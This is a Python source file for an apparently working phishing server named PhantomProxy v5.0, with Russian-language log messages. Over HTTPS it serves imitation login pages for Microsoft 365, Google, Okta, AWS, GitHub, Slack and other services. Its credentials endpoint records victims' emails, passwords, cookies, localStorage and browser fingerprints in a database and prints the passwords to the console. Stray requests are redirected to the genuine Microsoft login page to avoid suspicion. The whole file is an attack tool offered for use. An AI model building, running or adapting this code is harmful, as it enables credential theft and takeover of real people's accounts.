from http.server import HTTPServer, BaseHTTPRequestHandler
import json, sqlite3, datetime, ssl, os
from urllib.parse import urlparse

DB = 'phantom.db'
TEMPLATES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')

def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY,
        email TEXT, password TEXT, service TEXT, ip TEXT,
        user_agent TEXT, screen_resolution TEXT, timezone TEXT,
        cookies TEXT, local_storage TEXT, fingerprint TEXT,
        created_at TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

PHISHLETS = {
    'microsoft': ('Microsoft 365', 'microsoft_login.html'),
    'google': ('Google Workspace', 'google_login.html'),
    'okta': ('Okta SSO', 'okta_login.html'),
    'aws': ('AWS Console', 'aws_login.html'),
    'github': ('GitHub', 'github_login.html'),
    'linkedin': ('LinkedIn', 'linkedin_login.html'),
    'dropbox': ('Dropbox', 'dropbox_login.html'),
    'slack': ('Slack', 'slack_login.html'),
    'zoom': ('Zoom', 'zoom_login.html'),
    'salesforce': ('Salesforce', 'salesforce_login.html'),
}

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        
        if parsed.path == '/health':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"ok","service":"https-proxy"}')
        
        elif parsed.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            html = '<html><head><title>PhantomProxy v5.0</title></head><body>'
            html += '<h1>PhantomProxy v5.0 - Доступные фишлеты:</h1><ul>'
            for name, (service, _) in PHISHLETS.items():
                html += f'<li><a href="/{name}">{service}</a> - https://<IP>:8443/{name}</li>'
            html += '</ul></body></html>'
            self.wfile.write(html.encode())
        
        elif parsed.path[1:] in PHISHLETS:
            template = PHISHLETS[parsed.path[1:]][1]
            template_path = os.path.join(TEMPLATES_DIR, template)
            
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            
            if os.path.exists(template_path):
                with open(template_path, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.wfile.write(f'<h1>{PHISHLETS[parsed.path[1:]][0]} Login</h1><p>Template loading...</p>'.encode())
        
        else:
            self.send_response(302)
            self.send_header('Location', 'https://login.microsoftonline.com')
            self.end_headers()
    
    def do_POST(self):
        parsed = urlparse(self.path)
        
        if parsed.path == '/api/v1/credentials':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode())
                
                conn = sqlite3.connect(DB)
                c = conn.cursor()
                c.execute('''INSERT INTO sessions (
                    email, password, service, ip, user_agent,
                    screen_resolution, timezone, cookies, local_storage,
                    fingerprint, created_at
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', (
                    data.get('email', ''),
                    data.get('password', ''),
                    data.get('service', 'Unknown'),
                    self.client_address[0],
                    data.get('userAgent', ''),
                    data.get('screenResolution', ''),
                    data.get('timezone', ''),
                    data.get('cookies', ''),
                    data.get('localStorage', ''),
                    json.dumps(data.get('fingerprint', {})),
                    datetime.datetime.now().isoformat()
                ))
                conn.commit()
                conn.close()
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"success": true, "message": "Credentials saved"}')
                
                print(f'\n🎯 [{datetime.datetime.now()}] НОВЫЕ ДАННЫЕ:')
                print(f'   Service: {data.get("service", "Unknown")}')
                print(f'   Email: {data.get("email", "")}')
                print(f'   Password: {data.get("password", "")}')
                print(f'   IP: {data.get("ip", self.client_address[0])}')
                
            except Exception as e:
                print(f'❌ Ошибка сохранения: {e}')
                self.send_response(500)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'success': False, 'error': str(e)}).encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        print(f'[{datetime.datetime.now()}] {self.client_address[0]} - {format % args}')

def run_server():
    server = HTTPServer(('0.0.0.0', 8443), Handler)
    
    cert_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'certs', 'cert.pem')
    key_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'certs', 'key.pem')
    
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(cert_path, key_path)
    
    server.socket = context.wrap_socket(server.socket, server_side=True)
    
    print('\n🔒 HTTPS Proxy запущен на порту 8443')
    print('🎣 Доступные фишлеты:')
    for name, (service, _) in PHISHLETS.items():
        print(f'   /{name} - {service}')
    print(f'\n📁 Templates: {TEMPLATES_DIR}')
    print('🎯 Главная: https://<IP>:8443/')
    
    server.serve_forever()

if __name__ == '__main__':
    run_server()
